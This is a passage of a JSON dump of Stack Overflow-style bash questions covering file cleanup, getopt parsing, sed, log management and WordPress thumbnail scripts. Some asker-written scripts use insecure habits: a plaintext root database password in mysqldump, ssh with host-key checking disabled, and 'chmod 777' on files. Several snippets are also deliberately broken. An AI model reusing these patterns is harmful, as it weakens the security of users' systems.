</p>\n\n<p>So is there any way I can <code>get notified if anything wrong has happened</code> in my script? Suppose if the <code>cluster is having some maintenance</code> and at that time I am running my script, so definitely it will be failing for sure, so can I be notified if my above scripts failed, so that I will be sure something wrong has happened.</p>\n\n<p>Hope my question is clear enough.</p>\n\n<p>Any thoughts will be appreciated.</p>\n"},{"tags":["linux","perl","bash","asterisk","init.d"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2963,"score":3,"question_id":3864877,"title":"How can I set environment variables in my Linux service for Asterisk even though it doesn't have a real user?","body":"<p>I have created a linux service that runs as a deamon (and gets started from /etc/init.d/X). I need to set some environment variables that can be accessed by the application.</p>\n\n<p>Here's the scenario. The application is a bunch of Perl AGI scripts that depend on (and therefore need to run as) asterisk user but asterisk doesn't have a shell. Ideally I'd just set this in <em>/home/asterisk/.bashrc</em> but that doesn't exist for asterisk.</p>\n\n<p>How can I set environment variables for my app in the asterisk user's running environment so that my app can use them?</p>\n"},{"tags":["linux","bash","delete","rm"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":102,"score":-1,"question_id":12458131,"title":"Delete all files in a directory, except those listed matching specific criteria","body":"<p>I need to automate a clean-up of a Linux based FTP server that only holds backup files.</p>\n\n<p>In our \"\\var\\DATA\" directory is a collection of directories. Any directory here used for backup begins with \"DEV\". In each \"DEVxxx*\" directory are the actual backup files, plus any user files that may have been needed in the course of maintenance on these devices.</p>\n\n<p>We only want to retain the following files - anything else found in these \"DEVxxx*\" directories is to be deleted:</p>\n\n<pre><code>The newest two backups:  ls -t1 | grep -m2 ^[[:digit:]{6}_Config]  \nThe newest backup done on the first of the month:  ls -t1 | grep -m1 ^[[:digit:]{4}01_Config] \nAny file that was modified less than 30 days ago:  find -mtime -30  \nOur good configuration file:  ls verification_cfg\n</code></pre>\n\n<p>Anything that doesn't match the above should be deleted.</p>\n\n<p>How can we script this? </p>\n\n<p>I'm guessing a BASH script can do this, and that we can create a cron job to run daily to perform the task.</p>\n"},{"tags":["sql","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":57,"score":0,"question_id":12491544,"title":"Passing string into bash script","body":"<p>I have this script which dumps a db:</p>\n\n<pre><code>cat /usr/bin/dbbkup\n#!/bin/bash\nmysqldump -uroot -proot db &gt; db_$(date +%d%H%M%S).sql\n</code></pre>\n\n<p>Which I execute like so:</p>\n\n<pre><code>dbbkup &amp;&amp; ls -atlr\n</code></pre>\n\n<p>But how can I pass an argument into this script that will prefix the db dump? E.G.</p>\n\n<pre><code>dbbkup -arg \"changed name of field\" &amp;&amp; ls -atlr\n</code></pre>\n\n<p>Then change the script to something like:</p>\n\n<pre><code>#!/bin/bash\nmysqldump -uroot -proot db &gt; db_$(arg)_$(date +%d%H%M%S).sql\n</code></pre>\n\n<p>Thanks =)</p>\n"},{"tags":["regex","bash","sed"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":12482102,"title":"Parsing memory dump (looking for a more elegant solution)","body":"<p>I am trying to parse the output of the s51 simulator using a bash script and sed. In a first step I want one single string containing all the bytes in hexadecimal form. The output of the simulator looks like this. The real output can be much longer, up to 64k.</p>\n\n<pre><code>0x0000 10 11 12 13 14 15 16 17 ........\n0x0008 18 19 00 00 00 00 00 00 ........\n0x0010 00 00 00 00 00 00 00 00 ........\n0x0018 00 00 00 00 00 00 00 00 ........\n0x0020 00 00 00 00 00 00 00 00 ........\n0x0028 00 00 00 00 00 00 00 00 ........\n0x0030 00 00 00 00 00 00 00 00 ........\ntimer #0(\"time\") ON: 0.001085 sec (13020 clks)\ntimer #0(\"isr\") ON,ISR: 0 sec (0 clks)\ntimer #0(\"idle\") ON,ISR: 0 sec (0 clks)\n</code></pre>\n\n<p>My code to parse is the following:</p>\n\n<pre><code>sed -e ':loop' -e 's/\\s\\([0-9a-f]\\{1\\}\\)\\([0-9a-f]\\{1\\}\\)/\\2\\1/g' -e 't loop' -n -e 's/.*\\(0x[0-9a-f]\\{4\\}\\)\\([0-9a-f]\\{16\\}\\).*/\\2/p' | sed -e ':a;N;$!ba;s/\\n//g'\n</code></pre>\n\n<p>The first 3 parts swap the two digits of each byte and removes the space. The 4th part removes the other lines and the address and ascii representation. The last part removes the connects the lines.</p>\n\n<p>This outputs a string likes this:</p>\n\n<pre><code>01112131415161718190000000....\n</code></pre>\n\n<p>I was wondering what I could do better.</p>\n"},{"tags":["osx","perl","bash","find"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":134,"score":4,"question_id":10707145,"title":"Find last modified file in a directory with white space","body":"<p>I found and tweaked this script to find the most recently modified file in a directory recursively. It only breaks when there is a space in the directory name. Can anyone help me adjust the script so it will read directories with space also?s</p>\n\n<pre><code>for i in *; do\n\nfind $i -type f | perl -ne 'chomp(@files = &lt;&gt;); my $p = 9; foreach my $f (sort { (stat($a))[$p] &lt;=&gt; (stat($b))[$p] } @files) { print scalar localtime((stat($f))[$p]), \"\\t\", $f, \"\\n\" }' | tail -1\n\ndone\n</code></pre>\n"},{"tags":["bash","unix","gcc","build"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12490307,"title":"Build gcc on linux script","body":"<p>Good day, i write script for building gcc on linux, my code is: </p>\n\n<pre><code>#!/bin/bash\n\nexport INSTALLATION_GCC=/opt\n\ncd $INSTALLATION_GCC\n\ntar xjvf gcc-4.7.0.tar.bz2\n\nexport srcdir=\"$INSTALLATION_GCC/gcc-4.7.0\"\n\nexport objdir=\"$INSTALLATION_GCC/gcc-bin\"\n\nexport insdir=\"$INSTALLATION_GCC/usr/local\"\n\nmkdir -p $srcdir\n\nmkdir -p $objdir\n\nmkdir -p $insdir\n\ncd $objdir\n\n$srcdir/configure --prefix=$insdir\n\nmake bootstrap\n</code></pre>\n\n<p>make install</p>\n\n<p>but when i run this script i get errors: </p>\n\n<pre><code>No such file or directoryopt\ntar (child): gcc-4.7.0.tar.bz2\\r: Cannot open: No such file or directory\ntar (child): Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error is not recoverable: exiting now\n/configure: No such file or directory\n'.  Stop. No rule to make target `bootstrap\n'.  Stop. No rule to make target `install\n</code></pre>\n\n<p>Why cd not work successful, if i execute my script (if i input this command in interactive mode all ok)?After building and installing gcc why my version of gcc not changing, how can i replace old version gcc properly?  </p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12489020,"title":"confusing case of a bash completion script","body":"<p>I'm having trouble understanding what the following code does in a bash completion script:</p>\n\n<pre><code>    case \"$last\" in\n    +\\(--import|-i\\))\n            _filedir '+(txt|html)';;\n</code></pre>\n\n<p>When is that case ever met? I thought the second line above would be something like</p>\n\n<pre><code>--import|-i)\n</code></pre>\n\n<p>which does make sense to me. I grepped my <code>bash_completion.d</code> directory for <code>'+\\\\('</code> but that one was the only one that came up so I guess it's not that common.</p>\n"},{"tags":["bash","sed","awk"],"answer_count":8,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":122,"score":2,"question_id":12468173,"title":"change lowercase file names to uppercase with awk ,sed or bash","body":"<p>I would like to change lowercase filenames to uppercase with awk/sed/bash</p>\n\n<p>your help would be appreciated</p>\n\n<pre><code>aaaa.txt\nvvjv.txt\nacfg.txt\n</code></pre>\n\n<p>desired output</p>\n\n<pre><code>AAAA.txt\nVVJV.txt\nACFG.txt\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12488556,"title":"bash loop skip commented lines","body":"<p>I'm looping over lines in a file.  I just need to skip lines that start with \"#\".\nHow do I do that?</p>\n\n<pre><code> #!/bin/sh \n\n while read line; do\n    if [\"$line doesn't start with #\"];then\n     echo \"line\";\n    fi\n done &lt; /tmp/myfile\n</code></pre>\n\n<p>Thanks for any help!</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12444125,"title":"Bash string (command output) equality test","body":"<p>I have a simple script to check whether webpage contains a specified string. It looks like:</p>\n\n<pre><code>#!/bin/bash\nres=`curl -s \"http://www.google.com\" | grep \"foo bar foo bar\" | wc -l`\nif [[ $res == \"0\" ]]; then\n    echo \"OK\"\nelse\n    echo \"Wrong\"\nfi\n</code></pre>\n\n<p>As you can see, I am looking to get \"OK\", but got a \"Wrong\".</p>\n\n<p>What's wrong with it?</p>\n\n<p>If I use if [ $res == \"0\" ], it works. If I just use res=\"0\" instead of res=<code>curl...</code>, it also can obtain the desired results. </p>\n\n<p>Why are there these differences?</p>\n"},{"tags":["linux","bash","find"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12488035,"title":"How can I use the `find` command in Linux to remove non-empty directories?","body":"<p>I have temp directories full of junk that all start with <code>__temp__</code> (e.g. <code>__temp__user_uploads</code>), which I want to delete with a cleanup function. My function attempt is to run:</p>\n\n<pre><code>find . -name __temp__* -exec rm -rf '{}' \\;\n</code></pre>\n\n<p>If I run the command and there are multiple <code>__temp__</code> directories (<code>__temp__foo</code> and <code>__temp__bar</code>), I get the output:</p>\n\n<pre><code>find: __temp__foo: unknown option\n</code></pre>\n\n<p>If I run the command and there is only 1 <code>__temp__</code> directory (<code>__temp__foo</code>), it is deleted and I get the output:</p>\n\n<pre><code>find: ./__temp__foo: No such file or directory\n</code></pre>\n\n<p>Why doesn't the command work, why is it inconsistent like that, and how can I fix it?</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":12487424,"title":"uppercase first character in a variable with bash","body":"<p>I want to uppercase jsut the first character in my string with bash.</p>\n\n<pre><code>foo=\"bar\";\n\n//uppercase first character\n\necho $foo;\n</code></pre>\n\n<p>should print \"Bar\";</p>\n"},{"tags":["linux","bash","tree"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12487141,"title":"Issues with making basic tree structure in bash script","body":"<p>I'm just trying to make a simple bash script to make a tree structure and I cannot spot where my logic is wrong.  As of now, the script will make it to the second depth but only fills out the first folder in it.  Can anyone spot my error(s)?</p>\n\n<p>Thanks</p>\n\n<pre><code>#!/bin/bash\n\ncreate(){\n\n directory=$1\n\n for((j=0; j &lt; depth; j++)); do\n\n\n  for x in ${directory[@]}; do\n\n    temp=( )\n\n    for((i=0; i &lt; breadth; i++)); do\n\n        mkdir $x/$i \n\n        temp=($temp $x/$i)\n\n    done    \n\n  done  \n\n    directory=($temp)\n\n done\n\n\n\n}\n\nbreadth=3\ndepth=2\n\ndirec=(tree)\n\ncreate $direc\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12487046,"title":"renaming a bunch of files in bash","body":"<p>I have a few files in linux:</p>\n\n<pre><code>_foo_1.php\n_foo_2.php\n_foo_3.php\n</code></pre>\n\n<p>I want to rename them all from _foo to _bar, preserving the rest of the filename.</p>\n\n<p>I have tried this, but it doesn't rename anything:</p>\n\n<pre><code>rename 's/_foo/_bar/' *.php\n</code></pre>\n"},{"tags":["zsh","bash","zshrc"],"answer_count":1,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":2611,"score":6,"question_id":764600,"title":"How can you export your .bashrc to .zshrc?","body":"<p>I am trying to move to zsh from Bash.</p>\n\n<p>I put my .bashrc directly to my .zshrc, and it caused a lot of errors when I try to use Bash again.</p>\n\n<p><strong>How can you export your .bashrc to .zshrc?</strong></p>\n"},{"tags":["bash","for-loop","dig"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12483123,"title":"A script to show me an IP and ns[1,2].* on the same line","body":"<p>I have all the IPs that I want to <code>dig +trace -x</code> in a file called 'ips'.</p>\n\n<p>I want to only see the ns1 (and/or) ns2 records of the IP and and have the IP and the ns1 or ns2 record output on the same line, like so:</p>\n\n<pre><code>1 - $IP - $NS\n2 - $IP - $NS\netc.\n</code></pre>\n\n<p>Right now, I only have a script I call 'digdug', which looks like this...</p>\n\n<pre><code>for i in `cat ips`\ndo\ndig +trace -x $i | tail -n7\ndone\n</code></pre>\n\n<p>and then I am able to see the IP that it is digging by running: <code>bash -x digdug</code></p>\n\n<p>But, what I really need is the IP and the ns record on one line, then the next IP in the list with ns record on the next line. Then the next and so on.</p>\n\n<p>Any help is greatly appreciated!</p>\n"},{"tags":["bash","shell","parallel-processing"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12476676,"title":"command or code to run two processes in the same time (parallel)","body":"<p>I have two processes:</p>\n\n<p>The first process, I run with: . / Vlc video >> resu.txt   it gives me an output file resu.txt</p>\n\n<p>The second process is a script that makes calculations on the file resu.txt\nThe name of this script is calcule.sh, I run it with: . / Calcul.sh</p>\n\n<p>I want to run two processes at the same time. ie having two parallel processes.</p>\n\n<p>how I could run two processes in parallel (. / Vlc video >> resu.txt and  . / Calcul.s ). Is there a command that do this ? Please,  can you propose me a code that will do that</p>\n\n<p>Thank you in advance for your answers.</p>\n"},{"tags":["bash","imagemagick"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2239,"score":0,"question_id":2962723,"title":"resizing images with imagemagick via shell script","body":"<p>I don't really know that much about bash scripts OR imagemagick, but I am attempting to create a script in which you can give some sort of regexp matching pattern for a list of images and then process those into new files that have a given filename prefix.</p>\n\n<p>for example given the following dir listing:</p>\n\n<blockquote>\n  <p>allfiles01.jpg allfiles02.jpg\n  allfiles03.jpg</p>\n</blockquote>\n\n<p>i would like to call the script like so:</p>\n\n<pre><code>./resisemany.sh allfiles*.jpg 30 newnames*.jpg\n</code></pre>\n\n<p>the end result of this would be that you get a bunch of new files with newnames, the numbers match up,</p>\n\n<p>so far what i have is:</p>\n\n<pre><code>IMAGELIST=$1\nRESIEZFACTOR=$2\nNUMIMGS=length($IMAGELIST)\n\nfor(i=0; i&lt;NUMIMGS; i++)\n  convert $IMAGELIST[i] -filter bessel -resize . RESIZEFACTOR . % myfile.JPG\n</code></pre>\n\n<p>Thanks for any help...\nThe parts that I obviously need help with are\n1. how to give a bash script matching criteria that it understands\n2. how to use the $2 without having it match the 2nd item in the image list\n3. how to get the length of the image list\n4. how to create a proper for loop in such a case\n5. how to do proper text replacement for a shell command whereby you are appending items as i allude to.</p>\n\n<p>jml</p>\n"},{"tags":["linux","bash","shell","awk","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":93,"score":1,"question_id":12481792,"title":"Bash Grep and Send","body":"<p>I'm new to bash and trying to learn a figure it out.</p>\n\n<p>I have the following:</p>\n\n<pre><code>Sep 18 21:05:40 host kernel: Firewall: *Port Flood* IN=venet0 OUT= MAC= SRC=118.223.69.254 DST=10.0.0.1 LEN=40 TOS=0x00 PREC=0x00 TTL=244 ID=9398 PROTO=TCP SPT=9876 DPT=80 WINDOW=5840 RES=0x00 SYN URGP=0\n</code></pre>\n\n<p>How can I pull the SRC IP out and pipe it to csf -d {IP HERE}</p>\n\n<p>I would use something like</p>\n\n<p><code>sed -e 's/\\([0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\).*$/\\1/' /var/log/messages</code> right?</p>\n\n<p><strong>EDIT:</strong> </p>\n\n<p>since the <code>SPT=</code> is the name in all could I pull that and grab the IP some how?</p>\n"},{"tags":["python","perl","bash","shell"],"answer_count":7,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12479712,"title":"removing numeric value from a string","body":"<p>I have a file of 2000 rows and 1 column</p>\n\n<pre><code>1007_s_at1\n1007_s_at2\n1007_s_at3\n1007_s_at4\n1007_s_at5\n1007_s_at6\n1007_s_at7\n1007_s_at8\n1007_s_at9\n1007_s_at10\n</code></pre>\n\n<p>looks like above, I want to remove the last numeric value after \"at\". In principle whatever number is in the last should be truncated.</p>\n\n<p>I have tried things like splitting them and then rejoioning it, but it just complicates the problem and I am far away from answer.</p>\n\n<p>Could you please suggest something in bash or shell or python or perl to solve this.</p>\n\n<p>An output like below is desired</p>\n\n<pre><code>   1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n    1007_s_at\n</code></pre>\n\n<p>Thank you</p>\n"},{"tags":["linux","bash","unix","wildcard"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":12483553,"title":"How do I exclude a character from a range in a character class?","body":"<p>How do I combine the following lines for one character:</p>\n\n<pre><code>&gt; ls file[1-5]\n&gt; ls file[!3]\n</code></pre>\n\n<p>To produce the same result as:</p>\n\n<pre><code>&gt; ls file[1-2,4-5] \n&gt; file1 file2 file4 file5\n</code></pre>\n"},{"tags":["linux","bash","sh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12484163,"title":"Grab output from a script that was ran within another","body":"<p>I know the title is a bit confusing but here's my situation</p>\n\n<pre><code>#!/bin/bash\nfor node in `cat path/to/node.list`\ndo\n        echo \"Checking node: $node\" \n        ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no me@$node \"nohup  scriptXYZ.sh\"\ndone\n</code></pre>\n\n<p>Basically scriptXYZ has an output. Something like: <code>Node bla is Up</code>  or <code>Node bla is Down</code>. I want to do something that amounts to the following psudo code:</p>\n\n<pre><code>if (output_from_scriptXYZ == \"Node bla is Up\")\n    do this\nelse \n    do that\n</code></pre>\n\n<p>I've been trying to find a way to do this online but I couldn't find something that does this. Then again, I might not know what I'm searching for. </p>\n\n<p>Also as a bonus: Is there any way to tell if the scriptXYZ has an error while it ran? Something like a \"file does not exist\" -- not the script itself but something the script tried to do and thus resulting in an error. </p>\n"},{"tags":["bash","shell","unix","command-line","command-line-arguments"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":111,"score":1,"question_id":11978473,"title":"User friendly command line options","body":"<p>I know <code>boost::program_options</code> from c++ which enables me to write user- friendly command-line options in almost no time. With \"user- friendly\" I mean, short and long options and a descriptive help command which would look similar to this:</p>\n\n<pre><code>Copy standard input to each FILE, and also to standard output.\n\n  -a, --append              append to the given FILEs, do not overwrite\n  -i, --ignore-interrupts   ignore interrupt signals\n      --help     display this help and exit\n      --version  output version information and exit\n</code></pre>\n\n<p>For myself I had to find out that this is really awkward in bash with the built-in <code>getopts</code> only supporting short options. Is this correct or am I wrong?</p>\n\n<p>How would you implement user friendly command line options? If you know any links, best practices or in depths tutorials I would be really much appreciated.</p>\n"},{"tags":["linux","bash","shell","scripting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12482359,"title":"How do I parse diskstats and output in JSON format with shell?","body":"<p>With a bash script, I am trying to get all of the physical disks from /proc/diskstats</p>\n\n<pre><code>   8       0 sda 14256 20634 1376722 133628 279800 2362075 21135024 2133492 0 261052 2259536\n   8       1 sda1 14105 20634 1375514 133520 279800 2362075 21135024 2133492 0 261036 2259432\n   2       0 fd0 0 0 0 0 0 0 0 0 0 0 0\n</code></pre>\n\n<p>and echo their names in a format such as </p>\n\n<pre><code>{\n  \"data\":[\n  { \"{#DISK}\":\"sda\"},\n  { \"{#DISK}\":\"sdb\"},\n  ]\n}\n</code></pre>\n\n<p>I am trying to do this in such a way that will be supported by systems with Linux 2.6+. I also want to avoid partitions that may show up in diskstats, which have 4 fields instead of the 11 for disks.</p>\n\n<p>EDIT:</p>\n\n<p>I can get disk names with</p>\n\n<pre><code>cat /proc/diskstats | awk '{print $3}'\n</code></pre>\n\n<p>or</p>\n\n<pre><code>cat /proc/diskstats | head -1 | awk '{print $3}'\n</code></pre>\n\n<p>but I'm not sure how to iterate through and format it.</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12483048,"title":"Bash Script - Daemon","body":"<p>I'm not a programmer, nor a security expert. I work with CheckPoint and I have the following code, developed by me for use with CheckPoint Logs management:</p>\n\n<pre><code>#!/bin/bash -\n\n# Necessario carregar as variaveis do CheckPoint:\n. /etc/profile.d/CP.sh\n\n# Description:\n# Log management\n\n# Crontab:\n#0 */1 * * * nohup /etc/scripts/log start 0&lt;&amp;- 1&gt;&gt; /var/log/LOG 2&gt;&amp;1 &amp;\n\n# Vars:\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/etc/scripts\nFILE=/var/log/LOG\nSLEEP=600\nRUN_TIME=01\nLOG_DIR=$FWDIR/log\nGZIP_RET=1\nSCP_RET=1\nSCP_USR=openssh\nSCP_DEST_DIR=LOGS_RJ\nSCP_IP=192.168.1.41\nTIME=$(clock | awk {'print $4'} | cut -d ':' -f 1)\nCHECK=$(ps aux | grep 'log start' | grep -v grep | wc -l)\nDATE=$(date +%y%m%d)\n\n# Functions:\n\nusage() {\n    echo \"Usage: $0 [start|stop]\" &gt;&amp;2\n    exit 1\n}\n\ndo_launch() {\n    if [ \"$CHECK\" -eq 2 ] ; then\n        set -x\n        #exec &gt;&gt; /var/log/LOG 2&gt;&amp;1\n    else\n        exit\n    fi\n}\n\ndo_compression() {\n    SEARCH=`find \"$LOG_DIR\" -name '20*' -daystart -follow -mtime +$GZIP_RET | grep -v gz`\n    for i in $SEARCH ; do\n        gzip -f -9 $i ;\n    done\n}\n\ndo_scp() {\n    SEARCH=`find \"$LOG_DIR\" -name '20*' -daystart -follow -mtime +$SCP_RET`\n    for i in $SEARCH ; do\n        scp $i $SCP_USR@$SCP_IP:$SCP_DEST_DIR &amp;&amp; rm $i || break 1;\n    done\n}\n\n# Work\nif [ \"$#\" -ne 1 ]\nthen\n    usage\nelse\n    case \"$@\" in\n        start)\n            while true ; do\n                do_launch\n                while true ; do\n                    if [ \"$TIME\" -eq \"$RUN_TIME\" ] ; then\n                        do_scp\n                    else\n                        do_compression\n                    fi\n                    sleep $SLEEP\n                done\n            done\n            ;;\n        stop)\n            pkill -x log\n            ;;\n        *)\n        usage\n    esac\nfi\n\nexit\n</code></pre>\n\n<p>The script runs fine when run manually, but when I put in crontab <code>nohup /etc/scripts/log start 0&lt;&amp;- 1&gt;&gt; /var/log/LOG 2&gt;&amp;1 &amp;</code> or even run from terminal and logout and login, the script fail to loop/run but it is still runnning from <code>ps</code>.</p>\n\n<p>Can someone help me?</p>\n\n<p>Also, the bash version is 2.05b from CheckPoint, but if everything is fine from manual, I don't think the version is the reason.</p>\n"},{"tags":["bash","script","getopt"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":12468571,"title":"Getopt in shell","body":"<p>I am writing a shell script to parse options. It parses the options correctly but when I omit any input arguments it doesn't come out of the while loop.\nCan anyone help on this?</p>\n\n<pre><code>TEMP=`getopt -o ha:b:d:e:c: --l ca: \\-n \"$x\" -- \"$@\"`\n\neval set -- \"$TEMP\"\n\nwhile true; do\n\n  case \"$1\" in\n\n    -h)      print $USAGE\n             exit 0 ;;\n    -a)      case \"$2\" in\n               -*|\"\") error \"Option t, requires argument\";\n                      exit 1;;\n\n               *)  print $2\n                   T=${2^^} ; \n                   shift 2 ;;\n             esac ;;\n\n    -b)      case \"$2\" in\n               -*|\"\") error \"Option p, requires argument\";\n                   exit 1 ;;\n\n               *)  print $2\n                   PE=${2^^} ; \n                   shift 2 ;\n             esac ;;\n\n    -d)      case \"$2\" in\n               -*|\"\") error \"Option f, requires argument\";\n                      exit 1 ;;\n\n               *)  print $2 ; \n                   IN=$2 ;\n                   shift 2 ;;\n             esac ;;\n\n    -e)      case \"$2\" in\n               \"\"|-*) error \"Option e, requires argument\";\n                      exit 1 ;;\n\n               *)  print  $2 ; \n                   KEY=$2 ;\n                   shift 2 ;;\n             esac ;;\n    -c|--ca) case \"$2\" in\n               \"\"|-*) error \"Option c, requires argument\"; \n                   exit 1;;\n\n               *)  print $2 ;\n                   C=${2};\n                   shift 2 ;;\n             esac ;;\n\n\n   --)       shift ;\n             break ;;\n\n    *)       error \"Invalid Input!\" ;\n             exit 1 ;;\n\n  esac\ndone\n\n\nUSAGE:foo.sh -a arg1 -b arg2 -c arg3 -d arg 4 -e arg5\n</code></pre>\n\n<p>This works fine but</p>\n\n<pre><code>foo.sh -a arg1 -b arg2 -c arg3\n</code></pre>\n\n<p>doesn't come out of the while loop.</p>\n"},{"tags":["bash","caching","command-line","script","cli"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":11900239,"title":"Can i cache the output of a command on Linux from CLI?","body":"<p>I'm looking for an implementation of a '<em>cacheme</em>' command, which '<strong>memoizes</strong>' the output of whatever has in ARGV. If it never ran it, it will run it and somewhat memorize the output. If it ran it, it will just copy the output of the file (or even better, both output and error to &amp;1 and &amp;2 respectively).</p>\n\n<p>Let's suppose someone wrote this command, it would work like this.</p>\n\n<pre><code>$ time cacheme sleep 1    # first time it takes one sec\nreal   0m1.228s\nuser   0m0.140s\nsys    0m0.040s\n\n$ time cacheme sleep 1    # second time it looks for stdout in the cache (dflt expires in 1h)\n#DEBUG# Cache version found! (1 minute old)\n\nreal   0m0.100s\nuser   0m0.100s\nsys    0m0.040s\n</code></pre>\n\n<p>This example is a bit silly because it has no output. Ideally it would be tested on a script like <em>sleep-1-and-echo-hello-world.sh</em>.</p>\n\n<p>I created a small script that creates a file in /tmp/ with hash of full command name and username, but I'm pretty sure something already exists.</p>\n\n<p>Are you aware of any of this?</p>\n"},{"tags":["bash","awk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12481971,"title":"How to extract a fixed-length string using awk?","body":"<p>I want to run a script to extract a number of strings from a html file, and import all to a new file. More specifically, I want to look at the string between all <code>&lt;td&gt;</code> and <code>&lt;/td&gt;</code> pairs, if the string between them is of length <code>k</code>, then extract the string.</p>\n"},{"tags":["regex","bash","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12481692,"title":"Summarize count of multiple patterns in shell","body":"<p>I have a log file and the following commands</p>\n\n<pre><code>grep '\"REFERENCE\":\"78\",\"STATUS\":\"Buffered\"' file.log | wc -l\ngrep '\"REFERENCE\":\"78\",\"STATUS\":\"Delivered\"' file.log | wc -l\ngrep '\"REFERENCE\":\"78\",\"STATUS\":\"Not Delivered\"' file.log | wc -l\n</code></pre>\n\n<p>Is there a way using a one liner to get an output like:</p>\n\n<pre><code>Buffered: 30\nDelivered: 1200\nNot Delivered: 589\n</code></pre>\n\n<p>The output has not to be exactly the same.</p>\n"},{"tags":["wordpress","bash","thumbnails"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12462923,"title":"Regenerate Wordpress Thumbnails from bash","body":"<p>Is there an easy way for me to regenerate image thumbnails after changing Settings > Media > Thumbnail size?</p>\n\n<p>I know there are plugins for this but I have over 30k of images. Even the ajax one will take forever to complete.</p>\n\n<p>I am on a VPS CentOS so I can run things like iconv, ffmpegthumbs etc so is there a way for me to do this task from bash?</p>\n\n<p><strong>Update 1.</strong> </p>\n\n<p>Here is the script I wrote to do the job for me. I need to be in the folder which contains the images to run it.</p>\n\n<pre><code>#! /bin/bash\n# Copyright Synvi Group (http://www.synvigroup.com)\n# Custom script to generate wordpress thumbnails for smokingd\n# Dependencies: Imagemagick, rename, coreutils\necho Checking if sgthumbs already exists...\nrm -rf sgthumb &amp;\nwait\necho Checking if list file already exists...\nrm -f  list &amp;\nwait\necho Generate list of files...\nls -1 --file-type | grep -v -e -[0-9][0-9][0-9]x[0-9][0-9][0-9] | grep -v -e -[0-9][0-9][0-9][0-9]x[0-9][0-9][0-9] | grep -v -e -[0-9][0-9][0-9]x[0-9][0-9][0-9][0-9] | grep -v -e -[0-9][0-9][0-9][0-9]x[0-9][0-9][0-9][0-9] | grep -v -e -[0-9][0-9][0-9]x[0-9][0-9] | grep -v -e -[0-9][0-9]x[0-9][0-9][0-9] | grep -v -e -[0-9][0-9]x[0-9][0-9] &gt; list &amp;\nwait\necho Create sgthumb directory...\nmkdir sgthumb &amp;\nwait\necho Copying files...\nxargs -a list cp -t sgthumb/ &amp;\nwait\ncd sgthumb\necho Generating thumbnails...\necho Processing jpg files..\nmogrify -resize '610x200^' -gravity center -crop 610x200+0+0 +repage *.jpg &amp;\nwait\necho Processing png files..\nmogrify -resize '610x200^' -gravity center -crop 610x200+0+0 +repage *.png &amp;\nwait\necho Appending the new size to filenames...\nrename .jpg -610x200.jpg *.jpg &amp;\nwait\nrename .png -610x200.png *.png &amp;\nwait\necho Fixing permissions...\nchown smokingd:smokingd *\nwait\nchmod 777 *\nwait\necho Moving thumbnails to main directory...\ncp -p *.jpg ../\nwait\ncp -p *.png ../\nwait\necho Cleaning up..\ncd .. \nwait\nrm -rf sgthumb\nwait\nrm list\nwait\necho Done!\n</code></pre>\n\n<p>where USER is the user owning the files and PERMISSIONS are the correct ones for the files.</p>\n\n<p>Now I need to update the database in order for older posts to use the new thumbnails.\nThe old posts use a thumbnail of 150x150 and the thumbnail used has -150x150 appended to its name.</p>\n\n<p><strong>Update 